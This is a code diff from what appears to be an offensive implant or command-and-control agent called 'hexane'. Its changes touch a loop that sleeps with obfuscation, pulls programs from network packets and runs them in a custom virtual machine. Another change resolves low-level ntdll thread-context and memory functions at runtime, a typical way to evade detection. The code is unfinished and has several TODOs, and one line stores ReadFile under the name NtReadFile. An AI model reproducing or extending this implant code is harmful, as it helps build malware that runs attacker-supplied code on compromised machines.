@@ -5,7 +5,8 @@
 #include "vreg.hpp"
 #include "network.hpp"
 
-extern uintptr_t __instance;
+#define HEXANE __hexane *ctx = __context;
+__data __hexane __context;
 __rdata const uintptr_t __handler[256];
 
 typedef struct {
@@ -80,7 +81,7 @@ namespace vm {
 				sleep_obf();  // TODO:
 
 				// TODO: manual mapping probably needs to be done here.
-				if (!network::read_program_from_packet(m_program, m_program_size)) { // TODO:
+				if (!network::read_program_from_packet(m_program)) { // TODO:
 					continue; 
 				}
 				vm_entry(&vmcs); 
@@ -136,12 +137,18 @@ namespace vm {
 			}
 		}
 
-		__function void vm_init_memory() {
+		__function void vm_init_memory(void) {
 			HEXANE;
 
 			m_program_size = PROCESS_MAX_CAPACITY;
 			m_load_rsv_valid = false;
 			m_load_rsv_addr = 0LL;
+
+			ctx->win32.NtGetContextThread = GetProcAddress(GetModuleHandle("ntdll.dll"), "NtGetContextThread");
+			ctx->win32.NtSetContextThread = GetProcAddress(GetModuleHandle("ntdll.dll"), "NtSetContextThread");
+			ctx->win32.NtAllocateVirtualMemory = GetProcAddress(GetModuleHandle("ntdll.dll"), "NtAllocateVirtualMemory");
+			ctx->win32.NtFreeVirtualMemory = GetProcAddress(GetModuleHandle("ntdll.dll"), "NtFreeVirtualMemory");
+			ctx->win32.NtReadFile = GetProcAddress(GetModuleHandle("kernel32.dll"), "ReadFile");
 
 			NTSTATUS status = 0;
 			if (!NT_SUCCESS(status = ctx->win32.NtAllocateVirtualMemory(NtCurrentProcess(), (void**)&m_program, 0,
